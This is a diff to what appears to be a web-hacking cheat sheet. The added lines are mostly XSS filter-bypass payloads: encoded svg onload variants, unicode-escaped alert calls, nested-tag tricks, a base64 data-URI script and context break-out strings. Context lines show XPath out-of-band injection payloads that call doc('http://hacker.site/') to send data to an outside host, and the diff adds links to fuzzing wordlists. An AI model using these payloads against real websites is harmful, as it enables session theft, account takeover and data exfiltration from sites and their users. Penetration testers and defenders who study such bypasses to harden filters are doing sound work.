@@ -99,35 +99,92 @@ http://www.businessinfo.co.uk/labs/mxss/
 ### XSS Poliglote
 
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
-### Examples
+
+### Regex blacklist filtering
+
+(on\w+\s*=)
+<svc/onload=alert(1)>
+<svg//////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+  
+(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
+<svg onload%09=alert(1)>
+<svg %09onload=alert(1)>
+<svg %09onload%20=alert(1)>
+<svg onload%09%20%28%2C%3B=alert(1)>
+<svg onload%0B=alert(1)>
+
+### Keyword based in filter
+ 
+#### blocked - alert - bypass
+  
+<script>\u0061lert(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>eval("\u0061lert(1)")</script>
+<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
+  
+#### Removing HTML Tags
+  
+<scr<iframe>ipt>alert(1)</script>
+  
+### Scaping Quote
+  
+### Methods
+-> String.fromCharCode()
+-> unescape
+
+Ex:
+ 
+-> decode URI + unescape method
+  
+decodeURI(/alert(%22xss%22)/.source)
+  
+decodeURIComponent(/alert(%22xss%22)/.source)
+  
+Add execution sink for execution:
+  
+-> eval
+  
+### Escaping Parentheses
+  
+### Others Examples
+  
 #### HTML Tag
+  
 <div>
-attack
+here
 </div>
 
-<svg/onload=alert(1)
+-> <svg/onload=alert(1)
 
 #### HTML Tag Attributes
 
-<input value="attack"/>
-adaa"><a/href="data:text/html;base64,"PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show
-
-#### <script> Tag:
+<input value="here"/>
+ 
+-> adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--
+  
+#### <script> Tag
+  
 <script>
-var name="attack";
+var name="here";
 </div>
-ala";alert(1);//
+  
+-> ;alert(1);//
 
 #### Event Attributes
 
-<button onclick="reserve(attack);">Okay!</button>
+<button onclick="reserve(here);">
+Okay!
+</button>
 
-alert(1)
+-> alert(1)
 
 Dom Based
+  
 <script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href='"+ok+"'>ok</a>";
 
-javascript:alert(1)
+-> javascript:alert(1)
 
 ## JavaScript Encoding and Compressor:
 
@@ -362,10 +419,21 @@ echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read
 https://github.com/clarketm/s3recon
   
 ## XPATH
+  
+### Identify
+  -> Auth Bypass
+  -> Error
+  ->
+  
+error()
 
 * and doc('http://hacker.site/')
   
 * and doc('http://hacker.site/', name(/*) ))
+  
+### Tools
+  
+https://xcat.readthedocs.io/en/latest/
   
 ### Wordlists for SQLI e XPath - Authentication Bypass
 
@@ -380,8 +448,6 @@ https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/
 ### Doc for SQL Injection - Bypass
 
 https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
-
-
 
 ## Local File Inclusion - LFI
 
@@ -398,3 +464,11 @@ https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI
 ### Payloads for bypass:
 
 -> bypass_lfi.txt
+  
+### Wordlist for parameter fuzzing
+  
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
+  
+### Wordlist for subdomain fuzzing
+  
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
